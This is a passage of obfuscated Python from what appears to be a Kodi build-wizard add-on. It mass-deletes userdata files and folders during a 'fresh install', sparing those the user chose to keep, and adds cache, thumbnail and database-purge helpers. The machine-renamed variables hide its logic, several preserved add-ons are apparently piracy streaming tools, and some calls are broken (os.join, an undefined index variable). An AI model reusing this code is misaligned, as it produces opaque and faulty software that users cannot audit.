				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4902
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'skin.Premium.mod'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4903
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4904
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'skin.phenomenal'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4905
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4906
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'skin.titan'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4908
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4909
				elif OO00OO0000000OO00 =='sources.xml'and OOO000O00O00O00OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4911
				elif OO00OO0000000OO00 =='quicknav.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4914
				elif OO00OO0000000OO00 =='x1101.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4915
				elif OO00OO0000000OO00 =='b-srtym-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4916
				elif OO00OO0000000OO00 =='x1102.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4917
				elif OO00OO0000000OO00 =='b-sdrvt-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4918
				elif OO00OO0000000OO00 =='x1112.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4919
				elif OO00OO0000000OO00 =='b-tlvvyzyh-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4920
				elif OO00OO0000000OO00 =='x1111.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4921
				elif OO00OO0000000OO00 =='b-tvknyshrly-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4922
				elif OO00OO0000000OO00 =='x1110.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4923
				elif OO00OO0000000OO00 =='b-yldym-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4924
				elif OO00OO0000000OO00 =='x1114.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4925
				elif OO00OO0000000OO00 =='b-mvzyqh-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4926
				elif OO00OO0000000OO00 =='mainmenu.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4927
				elif OO00OO0000000OO00 =='skin.Premium.mod.properties'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4928
				elif OO00OO0000000OO00 =='x1122.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4930
				elif OO00OO0000000OO00 =='b-spvrt-b.DATA.xml'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4931
				elif OO00OO0000000OO00 =='favourites.xml'and OOO000O00O00O00OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4936
				elif OO00OO0000000OO00 =='guisettings.xml'and OOO000O00O00O00OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4938
				elif OO00OO0000000OO00 =='profiles.xml'and OOO000O00O00O00OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4939
				elif OO00OO0000000OO00 =='advancedsettings.xml'and OOO000O00O00O00OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4940
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4941
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'program.apollo'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4942
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4943
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.elementum'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4946
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4947
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4948
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'weather.yahoo'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4949
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.quasar'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4950
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'program.apollo'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4951
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4952
				elif OOO000O00O00O00OO [O0OOOO000OOOOOO00 -2 ]=='userdata'and OOO000O00O00O00OO [O0OOOO000OOOOOO00 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOO000O00O00O00OO [O0OOOO000OOOOOO00 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4953
				elif OO00OO0000000OO00 in LOGFILES :wiz .log ("Keep Log File: %s"%OO00OO0000000OO00 ,xbmc .LOGNOTICE )#line:4954
				elif OO00OO0000000OO00 .endswith ('.db'):#line:4955
					try :#line:4956
						if OO00OO0000000OO00 ==O0OO00O0O000000OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO00OO0000000OO00 ,KODIV ),xbmc .LOGNOTICE )#line:4957
						else :os .remove (os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ))#line:4958
					except Exception as O0O00OOOOO0000O0O :#line:4959
						if not OO00OO0000000OO00 .startswith ('Textures13'):#line:4960
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4961
							wiz .log ("-> %s"%(str (O0O00OOOOO0000O0O )),xbmc .LOGNOTICE )#line:4962
							wiz .purgeDb (os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ))#line:4963
				else :#line:4964
					DP .update (int (wiz .percentage (O0000OO0OOO0O000O ,OO0OO00OO00O000O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OO0000000OO00 ),'')#line:4965
					try :os .remove (os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ))#line:4966
					except Exception as O0O00OOOOO0000O0O :#line:4967
						wiz .log ("Error removing %s"%os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),xbmc .LOGNOTICE )#line:4968
						wiz .log ("-> / %s"%(str (O0O00OOOOO0000O0O )),xbmc .LOGNOTICE )#line:4969
			if DP .iscanceled ():#line:4970
				DP .close ()#line:4971
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4972
				return False #line:4973
		for OO0O00O0OO0O00000 ,OOO0OO0O00O0O00O0 ,OOO00OOOO0OO0O0OO in os .walk (OO000O0O000O0OOO0 ,topdown =True ):#line:4974
			OOO0OO0O00O0O00O0 [:]=[O0OO000OOOO000O0O for O0OO000OOOO000O0O in OOO0OO0O00O0O00O0 if O0OO000OOOO000O0O not in EXCLUDES ]#line:4975
			for OO00OO0000000OO00 in OOO0OO0O00O0O00O0 :#line:4976
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OO0000000OO00 ),'')#line:4977
			  if OO00OO0000000OO00 not in ["Database","userdata","temp","addons","addon_data"]:#line:4978
			   if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4979
			    if not (OO00OO0000000OO00 =='skin.titan'and KEEPSKIN3 =='true'):#line:4981
			      if not (OO00OO0000000OO00 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4982
			       if not (OO00OO0000000OO00 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4983
			        if not (OO00OO0000000OO00 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4984
			         if not (OO00OO0000000OO00 =='program.apollo'and KEEPINFO =='true'):#line:4985
			          if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4986
			           if not (OO00OO0000000OO00 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4987
			            if not (OO00OO0000000OO00 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4988
			             if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4989
			              if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4990
			               if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4991
			                if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4992
			                 if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4993
			                  if not (OO00OO0000000OO00 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4994
			                   if not (OO00OO0000000OO00 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4995
			                    if not (OO00OO0000000OO00 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4996
			                     if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4997
			                       if not (OO00OO0000000OO00 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4999
			                           if not (OO00OO0000000OO00 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5003
			                            if not (OO00OO0000000OO00 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5004
			                             if not (OO00OO0000000OO00 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5005
			                              if not (OO00OO0000000OO00 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5006
			                               if not (OO00OO0000000OO00 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5007
			                                  shutil .rmtree (os .path .join (OO0O00O0OO0O00000 ,OO00OO0000000OO00 ),ignore_errors =True ,onerror =None )#line:5009
			if DP .iscanceled ():#line:5010
				DP .close ()#line:5011
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5012
				return False #line:5013
		DP .close ()#line:5014
		wiz .clearS ('build')#line:5015
		if over ==True :#line:5016
			return True #line:5017
		elif install =='restore':#line:5018
			return True #line:5019
		elif install :#line:5020
			buildWizard (install ,'normal',over =True )#line:5021
		else :#line:5022
			if INSTALLMETHOD ==1 :OO0OO0OOOO0OO0O0O =1 #line:5023
			elif INSTALLMETHOD ==2 :OO0OO0OOOO0OO0O0O =0 #line:5024
			else :OO0OO0OOOO0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5025
			if OO0OO0OOOO0OO0O0O ==1 :wiz .reloadFix ('fresh')#line:5026
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5027
	else :#line:5028
		if not install =='restore':#line:5029
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5030
			wiz .refresh ()#line:5031
def clearCache ():#line:5036
		wiz .clearCache ()#line:5037
def fixwizard ():#line:5041
		wiz .fixwizard ()#line:5042
def totalClean ():#line:5044
		wiz .clearCache ()#line:5046
		wiz .clearPackages ('total')#line:5047
		clearThumb ('total')#line:5048
		cleanfornewbuild ()#line:5049
def cleanfornewbuild ():#line:5050
		try :#line:5051
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5052
		except :#line:5053
			pass #line:5054
		try :#line:5055
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5056
		except :#line:5057
			pass #line:5058
		try :#line:5059
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5060
		except :#line:5061
			pass #line:5062
def clearThumb (type =None ):#line:5063
	OO0OOO000000O0OO0 =wiz .latestDB ('Textures')#line:5064
	if not type ==None :O000O0OOOOO000OOO =1 #line:5065
	else :O000O0OOOOO000OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0OOO000000O0OO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5066
	if O000O0OOOOO000OOO ==1 :#line:5067
		try :wiz .removeFile (os .join (DATABASE ,OO0OOO000000O0OO0 ))#line:5068
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0OOO000000O0OO0 )#line:5069
		wiz .removeFolder (THUMBS )#line:5070
	else :wiz .log ('Clear thumbnames cancelled')#line:5072
	wiz .redoThumbs ()#line:5073
def purgeDb ():#line:5075
	OO0O00OO0000O0OOO =[];OO0O00O0O0O0O0000 =[]#line:5076
	for O0OO0OO000O000OOO ,O0O0OOO00OO0000O0 ,OO0000O0OO00O0OO0 in os .walk (HOME ):#line:5077
		for OO0O00O000OO0O0OO in fnmatch .filter (OO0000O0OO00O0OO0 ,'*.db'):#line:5078
			if OO0O00O000OO0O0OO !='Thumbs.db':#line:5079
				OOOO0O0000000O00O =os .path .join (O0OO0OO000O000OOO ,OO0O00O000OO0O0OO )#line:5080
				OO0O00OO0000O0OOO .append (OOOO0O0000000O00O )#line:5081
				OOOOOOO00OO00O000 =OOOO0O0000000O00O .replace ('\\','/').split ('/')#line:5082
				OO0O00O0O0O0O0000 .append ('(%s) %s'%(OOOOOOO00OO00O000 [len (OOOOOOO00OO00O000 )-2 ],OOOOOOO00OO00O000 [len (OOOOOOO00OO00O000 )-1 ]))#line:5083
	if KODIV >=16 :#line:5084
		OO00O0O0000O000O0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O00O0O0O0O0000 )#line:5085
		if OO00O0O0000O000O0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5086
		elif len (OO00O0O0000O000O0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5087
		else :#line:5088
			for O0O0O0O0OOO000OOO in OO00O0O0000O000O0 :wiz .purgeDb (OO0O00OO0000O0OOO [O0O0O0O0OOO000OOO ])#line:5089
	else :#line:5090
		OO00O0O0000O000O0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0O00O0O0O0O0000 )#line:5091
		if OO00O0O0000O000O0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5092
		else :wiz .purgeDb (OO0O00OO0000O0OOO [O0O0O0O0OOO000OOO ])#line:5093
def fastupdatefirstbuild (O00O00000O0OO0O0O ):#line:5099
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5101
	if ENABLE =='Yes':#line:5102
		if not NOTIFY =='true':#line:5103
			OOOO0O000O0O0OOOO =wiz .workingURL (NOTIFICATION )#line:5104
			if OOOO0O000O0O0OOOO ==True :#line:5105
				O000OOOO00O0O00OO ,OOOO0OOO0OOOO0O0O =wiz .splitNotify (NOTIFICATION )#line:5106
				if not O000OOOO00O0O00OO ==False :#line:5108
					try :#line:5109
						O000OOOO00O0O00OO =int (O000OOOO00O0O00OO );O00O00000O0OO0O0O =int (O00O00000O0OO0O0O )#line:5110
						checkidupdate ()#line:5111
						wiz .setS ("notedismiss","true")#line:5112
						if O000OOOO00O0O00OO ==O00O00000O0OO0O0O :#line:5113
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000OOOO00O0O00OO ),xbmc .LOGNOTICE )#line:5114
						elif O000OOOO00O0O00OO >O00O00000O0OO0O0O :#line:5116
							wiz .log ("[Notifications] id: %s"%str (O000OOOO00O0O00OO ),xbmc .LOGNOTICE )#line:5117
							wiz .setS ('noteid',str (O000OOOO00O0O00OO ))#line:5118
							wiz .setS ("notedismiss","true")#line:5119
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5122
					except Exception as O0O0000OO0O00OOOO :#line:5123
						wiz .log ("Error on Notifications Window: %s"%str (O0O0000OO0O00OOOO ),xbmc .LOGERROR )#line:5124
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5126
